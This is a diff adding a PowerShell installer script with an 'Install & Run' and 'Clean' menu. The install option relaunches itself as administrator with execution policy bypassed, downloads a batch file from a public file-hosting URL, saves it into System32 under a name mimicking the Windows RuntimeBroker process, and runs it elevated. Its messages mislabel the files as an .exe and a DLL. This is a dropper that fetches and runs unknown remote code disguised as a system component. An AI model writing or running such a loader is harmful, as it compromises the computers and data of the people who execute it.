@@ -1,0 +1,121 @@
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Write-Host "Hi Member Zee CMD"
+Write-Host "1. Install & Run"
+Write-Host "2. Clean"
+
+$choice = Read-Host "Enter choice (1/2)"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "Restarting with Administrator privileges..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerss.bat"
+$dllDestination = Join-Path $system32Path "RuntimeBrokerss.dll"
+$exeUrl = "https://files.catbox.moe/vdi5bf.bat"
+$dllUrl = "nil"
+
+# -----------------------------
+# Install & Run Mode
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "`nStarting installation..."
+
+    # Check and download DLL if not exists
+    if (Test-Path $dllDestination) {
+        Write-Host "Guna.UI2.dll already exists, skipping download." -ForegroundColor Yellow
+    } else {
+        Write-Host "Downloading Guna.UI2.dll..."
+        try {
+            Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination
+            Write-Host "Guna.UI2.dll download completed." -ForegroundColor Green
+        } catch {
+            Write-Host "Guna.UI2.dll download failed: $_" -ForegroundColor Red
+            exit
+        }
+    }
+
+    # Check and download exe if not exists
+    if (Test-Path $exeDestination) {
+        Write-Host "RuntimeBrokerss.exe already exists, skipping download." -ForegroundColor Yellow
+    } else {
+        Write-Host "Downloading and renaming executable to RuntimeBrokerss.exe..."
+        try {
+            $tempFile = Join-Path $env:TEMP "seanual_temp.exe"
+            Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
+            Move-Item -Path $tempFile -Destination $exeDestination -Force
+            Write-Host "RuntimeBrokerss.exe download completed." -ForegroundColor Green
+        } catch {
+            Write-Host "RuntimeBrokerss.exe download failed: $_" -ForegroundColor Red
+            exit
+        }
+    }
+
+    # Run the program directly
+    Write-Host "Starting the program..."
+    try {
+        Start-Process -FilePath $exeDestination -Verb RunAs
+        Write-Host "Program started successfully." -ForegroundColor Green
+    } catch {
+        Write-Host "Failed to start program: $_" -ForegroundColor Red
+    }
+
+    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
+}
+
+# -----------------------------
+# Clean Mode
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "Cleaning up installation..."
+
+    # Stop the process if running
+    Write-Host "Stopping RuntimeBrokerss.exe process..."
+    try {
+        Stop-Process -Name "RuntimeBrokerss" -Force -ErrorAction SilentlyContinue
+        Write-Host "Process stopped." -ForegroundColor Green
+    } catch {
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+    }
+
+    # Remove files if they exist
+    $removedFiles = @()
+    
+    if (Test-Path $exeDestination) { 
+        Remove-Item $exeDestination -Force 
+        $removedFiles += "RuntimeBrokerss.exe"
+        Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
+    } else {
+        Write-Host "RuntimeBrokerss.exe not found, skipping removal." -ForegroundColor Yellow
+    }
+    
+    if (Test-Path $dllDestination) { 
+        Remove-Item $dllDestination -Force 
+        $removedFiles += "Guna.UI2.dll"
+        Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
+    } else {
+        Write-Host "Guna.UI2.dll not found, skipping removal." -ForegroundColor Yellow
+    }
+
+    if ($removedFiles.Count -eq 0) {
+        Write-Host "No files found to remove." -ForegroundColor Yellow
+    } else {
+        Write-Host "Removed files: $($removedFiles -join ', ')" -ForegroundColor Green
+    }
+
+    Write-Host "Cleanup completed." -ForegroundColor Green
+}
+
+else {
+    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
+}
